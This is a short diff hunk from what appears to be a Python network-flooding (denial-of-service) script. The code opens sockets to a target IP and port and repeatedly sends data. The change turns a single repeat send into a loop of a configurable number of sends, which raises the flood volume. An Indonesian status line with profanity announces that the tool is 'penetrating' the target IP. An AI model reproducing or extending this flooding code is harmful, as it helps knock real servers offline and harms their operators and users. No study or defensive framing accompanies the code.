@@ -114,7 +114,7 @@ def run():
              s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
              s.connect((orgip,port)) 
              s.send(data) 
-             for x in range(1):
+             for x in range(times):
                  s.send(data) 
              print(i +" PABLO BERSIAP MENEMBUS FUCKING IP => %s DENGAN PORT : %s"%(orgip,port)) 
          except socket.error: 
